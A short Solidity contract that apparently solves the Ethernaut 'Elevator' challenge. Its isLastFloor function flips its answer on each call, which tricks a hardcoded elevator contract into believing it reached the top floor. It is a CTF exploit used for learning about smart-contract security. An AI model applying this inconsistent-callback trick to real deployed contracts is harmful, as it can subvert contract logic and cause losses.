// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

interface Elevator {
    function goTo(uint _floor) external;
}

contract Building {
    bool lastFloor = true;
    address elevatorAddress = 0x8C24c280f4d01936566460cF462b0CdEe14791B6;

    function goToTheTop() external {
        Elevator elevator = Elevator(elevatorAddress);
        elevator.goTo(3);
    }

    function isLastFloor(uint _floor) public returns (bool) {
        lastFloor = !lastFloor;
        return lastFloor;
    }
}
